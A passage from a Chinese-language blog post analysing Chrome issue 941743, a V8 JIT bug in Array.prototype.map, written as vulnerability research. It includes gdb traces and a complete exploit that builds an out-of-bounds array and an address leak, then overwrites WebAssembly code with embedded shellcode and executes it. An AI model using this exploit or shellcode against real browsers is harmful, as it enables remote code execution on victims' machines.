0x7ffc6bfa0d18 —▸ 0x7ffc6bfa0d80 —▸ 0x7ffc6bfa0da8 —▸ 0x7ffc6bfa0e10 —▸ 0x7ffc6bfa0e60 ◂— ...</span><br><span class="line"> RSP  0x7ffc6bfa0ce0 ◂— 0x2</span><br><span class="line"> RIP  0xd833f382f6a ◂— vmovsd qword ptr [rbx + r14*8 + 0xf], xmm0</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0xd833f382f6a    vmovsd qword ptr [rbx + r14*8 + 0xf], xmm0</span><br><span class="line">   0xd833f382f71    jmp    0xd833f382e90 &lt;0xd833f382e90&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="疑难问题"><a href="#疑难问题" class="headerlink" title="疑难问题"></a>疑难问题</h2><p>我们还注意到一个细节，我们的数组是HOLEY_SMI_ELEMENTS，首先，SMI是为了满足JSCreateArray不内联的条件，而HOLEY是为了能够溢出方便控制内存，因为空洞的原因，不会对某块区域进行写，从而不至于破坏内存中其他地方，仅去覆盖我们需要的地方。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,,,,<span class="number">4</span>];</span><br></pre></td></tr></table></figure>
+<p>另一个问题是为何要防止JSCreateArray内联，首先，我们去除开头的Array(2**30)，然后观察IR图。没内联时是这样的</p>
+<img src="/ha1vk/2021/03/19/issue-941743/3.jpg" class="">
+<p>内联以后是这样的，因为内联多了个CheckBound，且我们触发漏洞的length显然超过这个范围，这将导致直接deoptimization bailout。</p>
+<img src="/ha1vk/2021/03/19/issue-941743/4.jpg" class="">
+
+<p>gdb调试如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">0x00003bbfbc0830fb in ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> RAX  0x1caece4004d1 ◂— 0x1caece4005</span><br><span class="line"> RBX  0x7fa156f631b0 ◂— push   rbp</span><br><span class="line"> RCX  0x335e74882b69 ◂— 0x21000029b2ef682e</span><br><span class="line"> RDX  0x560d0e592ac0 —▸ 0x560d0e607a30 ◂— 0x1baddead0baddeaf</span><br><span class="line"> RDI  0x29b2ef682e89 ◂— 0x400001caece4001</span><br><span class="line"> RSI  0x3a04229817d9 ◂— 0x1caece400f</span><br><span class="line"> R8   0x2000066</span><br><span class="line"> R9   0x200006600000000</span><br><span class="line"> R10  0x100000000</span><br><span class="line"> R11  0x7fa156b61270 (v8::internal::IncrementalMarking::RetainMaps()) ◂— push   rbp</span><br><span class="line"> R12  0x7fffe6d138b0 —▸ 0x7fffe6d138d8 —▸ 0x7fffe6d13940 —▸ 0x7fffe6d13990 —▸ 0x7fffe6d13cc0 ◂— ...</span><br><span class="line"> R13  0x560d0e588e70 —▸ 0x1caece400751 ◂— 0xde00001caece4004</span><br><span class="line"> R14  0x1caece4005b1 ◂— 0xff00001caece4005</span><br><span class="line"> R15  0x7fffe6d13810 —▸ 0x3bbfbc08304a ◂— jmp    0x3bbfbc082e16</span><br><span class="line"> RBP  0x7fffe6d13848 —▸ 0x7fffe6d138b0 —▸ 0x7fffe6d138d8 —▸ 0x7fffe6d13940 —▸ 0x7fffe6d13990 ◂— ...</span><br><span class="line"> RSP  0x7fffe6d13818 —▸ 0x3a042299f563 ◂— 0x1caece</span><br><span class="line">*RIP  0x3bbfbc0830fb ◂— mov    r13, 2</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   0x3bbfbc082e48    jae    0x3bbfbc082e5c &lt;0x3bbfbc082e5c&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x3bbfbc082e5c    mov    r9, r8</span><br><span class="line">   0x3bbfbc082e5f    shl    r9, 0x20</span><br><span class="line">   0x3bbfbc082e63    cmp    r8d, 0x7ff8</span><br><span class="line">   0x3bbfbc082e6a    jae    0x3bbfbc0830fb &lt;0x3bbfbc0830fb&gt;</span><br><span class="line">    ↓</span><br><span class="line"> ► 0x3bbfbc0830fb    mov    r13, 2</span><br><span class="line">   0x3bbfbc083102    call   0x3bbfbc102040 &lt;0x3bbfbc102040&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看到，因为cmp r8d, 0x7ff8比较不通过导致直接deoptimization bailout了，因此JSCreateArray不能内联。</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>通过溢出，覆盖Array的length，从而构造一个能自由控制的oob数组，然后就很容易利用了，当我们完成构造oob数组以后，我们使用throw抛出一个异常，从而可以使得map函数停止向后的迭代。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="title class_">DataView</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">p64f</span>(<span class="params">value1,value2</span>) &#123;</span><br><span class="line">   dv.<span class="title function_">setUint32</span>(<span class="number">0</span>,value1,<span class="literal">true</span>);</span><br><span class="line">   dv.<span class="title function_">setUint32</span>(<span class="number">0x4</span>,value2,<span class="literal">true</span>);</span><br><span class="line">   <span class="keyword">return</span> dv.<span class="title function_">getFloat64</span>(<span class="number">0</span>,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">i2f64</span>(<span class="params">value</span>) &#123;</span><br><span class="line">   dv.<span class="title function_">setBigUint64</span>(<span class="number">0</span>,<span class="title class_">BigInt</span>(value),<span class="literal">true</span>);</span><br><span class="line">   <span class="keyword">return</span> dv.<span class="title function_">getFloat64</span>(<span class="number">0</span>,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u64f</span>(<span class="params">value</span>) &#123;</span><br><span class="line">   dv.<span class="title function_">setFloat64</span>(<span class="number">0</span>,value,<span class="literal">true</span>);</span><br><span class="line">   <span class="keyword">return</span> dv.<span class="title function_">getBigUint64</span>(<span class="number">0</span>,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使得TurboFan不会将JSCreateArray内联化</span></span><br><span class="line"><span class="title class_">Array</span>(<span class="number">2</span>**<span class="number">30</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> oob_arr;</span><br><span class="line"><span class="keyword">var</span> obj_arr;</span><br><span class="line"><span class="keyword">var</span> arr_buf;</span><br><span class="line"><span class="keyword">var</span> oob_arr_length_idx = <span class="number">0x18</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">opt</span>(<span class="params">arr,flag</span>) &#123;</span><br><span class="line">   <span class="keyword">return</span> arr.<span class="title function_">map</span>(<span class="function">(<span class="params">value,index</span>)=&gt;</span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (index == <span class="number">0</span>) &#123;</span><br><span class="line">         oob_arr = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>];</span><br><span class="line">         obj_arr = [&#123;&#125;];</span><br><span class="line">         arr_buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x10</span>);</span><br><span class="line">         <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">            <span class="comment">/*%DebugPrint(a);</span></span><br><span class="line"><span class="comment">            %DebugPrint(oob_arr);*/</span></span><br><span class="line">         &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (index &gt; oob_arr_length_idx) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="string">&quot;oob finished!&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> value;</span><br><span class="line">   &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//HOLEY_SMI_ELEMENTS的数组</span></span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i &lt; <span class="number">0x10000</span>; i++) &#123;</span><br><span class="line">   <span class="title function_">opt</span>(a,<span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a.<span class="property">length</span> = <span class="number">0x2000000</span>;</span><br><span class="line">a.<span class="title function_">fill</span>(<span class="number">1</span>,<span class="number">0x18</span>); <span class="comment">//从0x18开始，为hole的在map时自动跳过,这样不至于损坏数据</span></span><br><span class="line">a.<span class="property">length</span> += <span class="number">0x66</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">   <span class="title function_">opt</span>(a,<span class="literal">true</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">   <span class="keyword">if</span> (oob_arr.<span class="property">length</span> &gt; <span class="number">3</span>) &#123;</span><br><span class="line">      <span class="title function_">print</span>(<span class="string">&quot;oob success!&quot;</span>);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="string">&quot;oob failed!&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//%DebugPrint(oob_arr);</span></span><br><span class="line"><span class="comment">//%DebugPrint(obj_arr);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">   obj_arr[<span class="number">0</span>] = obj;</span><br><span class="line">   <span class="keyword">return</span> <span class="title function_">u64f</span>(oob_arr[<span class="number">0x10</span>]) - <span class="number">0x1n</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0x00</span>,<span class="number">0x61</span>,<span class="number">0x73</span>,<span class="number">0x6D</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x85</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x60</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x7F</span>,<span class="number">0x03</span>,<span class="number">0x82</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x04</span>,<span class="number">0x84</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x70</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x05</span>,<span class="number">0x83</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x06</span>,<span class="number">0x81</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x07</span>,<span class="number">0x91</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x02</span>,<span class="number">0x06</span>,<span class="number">0x6D</span>,<span class="number">0x65</span>,<span class="number">0x6D</span>,<span class="number">0x6F</span>,<span class="number">0x72</span>,<span class="number">0x79</span>,<span class="number">0x02</span>,<span class="number">0x00</span>,<span class="number">0x04</span>,<span class="number">0x6D</span>,<span class="number">0x61</span>,<span class="number">0x69</span>,<span class="number">0x6E</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x0A</span>,<span class="number">0x8A</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x84</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x41</span>,<span class="number">0x2A</span>,<span class="number">0x0B</span>]);</span><br><span class="line"><span class="keyword">const</span> shellcode = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>([<span class="number">186</span>,<span class="number">114176</span>,<span class="number">46071808</span>,<span class="number">3087007744</span>,<span class="number">41</span>,<span class="number">2303198479</span>,<span class="number">3091735556</span>,<span class="number">487129090</span>,<span class="number">16777343</span>,<span class="number">608471368</span>,<span class="number">1153910792</span>,<span class="number">4132</span>,<span class="number">2370306048</span>,<span class="number">1208493172</span>,<span class="number">3122936971</span>,<span class="number">16</span>,<span class="number">10936</span>,<span class="number">1208291072</span>,<span class="number">1210334347</span>,<span class="number">50887</span>,<span class="number">565706752</span>,<span class="number">251658240</span>,<span class="number">1015760901</span>,<span class="number">3334948900</span>,<span class="number">1</span>,<span class="number">8632</span>,<span class="number">1208291072</span>,<span class="number">1210334347</span>,<span class="number">181959</span>,<span class="number">565706752</span>,<span class="number">251658240</span>,<span class="number">800606213</span>,<span class="number">795765090</span>,<span class="number">1207986291</span>,<span class="number">1210320009</span>,<span class="number">1210334349</span>,<span class="number">50887</span>,<span class="number">3343384576</span>,<span class="number">194</span>,<span class="number">3913728</span>,<span class="number">84869120</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule);</span><br><span class="line"><span class="keyword">var</span> func = wasmInstance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasm_shellcode_ptr_addr = <span class="title function_">addressOf</span>(wasmInstance) + <span class="number">0x100n</span>;</span><br><span class="line"><span class="comment">//%DebugPrint(wasmInstance);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*%DebugPrint(oob_arr);</span></span><br><span class="line"><span class="comment">%DebugPrint(arr_buf);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">oob_arr[<span class="number">0x18</span>] = <span class="title function_">i2f64</span>(<span class="number">0x100</span>);</span><br><span class="line">oob_arr[<span class="number">0x19</span>] = <span class="title function_">i2f64</span>(wasm_shellcode_ptr_addr);</span><br><span class="line"><span class="keyword">var</span> adv = <span class="keyword">new</span> <span class="title class_">DataView</span>(arr_buf);</span><br><span class="line"><span class="keyword">var</span> wasm_shellcode_addr = adv.<span class="title function_">getBigUint64</span>(<span class="number">0</span>,<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&#x27;wasm_shellcode_addr=&#x27;</span> + wasm_shellcode_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line">oob_arr[<span class="number">0x19</span>] = <span class="title function_">i2f64</span>(wasm_shellcode_addr);</span><br><span class="line"><span class="comment">//替换wasm的shellcode</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;shellcode.<span class="property">length</span>;i++) &#123;</span><br><span class="line">   adv.<span class="title function_">setUint32</span>(i*<span class="number">4</span>,shellcode[i],<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//执行shellcode</span></span><br><span class="line"><span class="title function_">func</span>();</span><br></pre></td></tr></table></figure>
+<h1 id="0x03-感想"><a href="#0x03-感想" class="headerlink" title="0x03 感想"></a>0x03 感想</h1><p>通过本次实践，对于V8的知识又增加了，还得不断的学习。</p>
+<h1 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h1><p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/map">Array.prototype.map()</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/62206287">把握机会之窗：看我如何获得Chrome 1-day漏洞并实现利用</a><br><a target="_blank" rel="noopener" href="https://laptrinhx.com/chrome-m73-issue-941743-2744271499/">Chrome M73 issue 941743</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/ha1vk/tags/JS%E5%BC%95%E6%93%8E%E6%BC%8F%E6%B4%9E/" rel="tag"># JS引擎漏洞</a>
+              <a href="/ha1vk/tags/%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86/" rel="tag"># 类型混淆</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/ha1vk/2021/03/17/CVE-2016-5168/" rel="prev" title="Chrome Issue 659475(CVE-2016-5168)漏洞分析">
+      <i class="fa fa-chevron-left"></i> Chrome Issue 659475(CVE-2016-5168)漏洞分析
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/ha1vk/2021/04/07/CVE-2017-15399/" rel="next" title="CVE-2017-15399">
+      CVE-2017-15399 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">2.</span> <span class="nav-text">0x01 前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Array-prototype-map"><span class="nav-number">2.1.</span> <span class="nav-text">Array.prototype.map()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Array-%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E9%93%BE%E5%8F%8AJIT%E4%BC%98%E5%8C%96%E5%88%86%E6%9E%90"><span class="nav-number">2.2.</span> <span class="nav-text">Array()函数调用链及JIT优化分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">2.2.1.</span> <span class="nav-text">源码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IR%E5%9B%BE%E5%88%86%E6%9E%90"><span class="nav-number">2.2.2.</span> <span class="nav-text">IR图分析</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">0x02 漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#patch%E5%88%86%E6%9E%90"><span class="nav-number">3.1.</span> <span class="nav-text">patch分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POC"><span class="nav-number">3.2.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%96%91%E9%9A%BE%E9%97%AE%E9%A2%98"><span class="nav-number">3.3.</span> <span class="nav-text">疑难问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">3.4.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-%E6%84%9F%E6%83%B3"><span class="nav-number">4.</span> <span class="nav-text">0x03 感想</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-%E5%8F%82%E8%80%83"><span class="nav-number">5.</span> <span class="nav-text">0x04 参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ha1vk</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/ha1vk/archives/">
+        
+          <span class="site-state-item-count">233</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/ha1vk/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/ha1vk/tags/">
+          
+        <span class="site-state-item-count">145</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ha1vk</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/ha1vk/lib/anime.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/ha1vk/js/utils.js"></script>
+
+<script src="/ha1vk/js/motion.js"></script>
+
+
+<script src="/ha1vk/js/schemes/muse.js"></script>
+
+
+<script src="/ha1vk/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
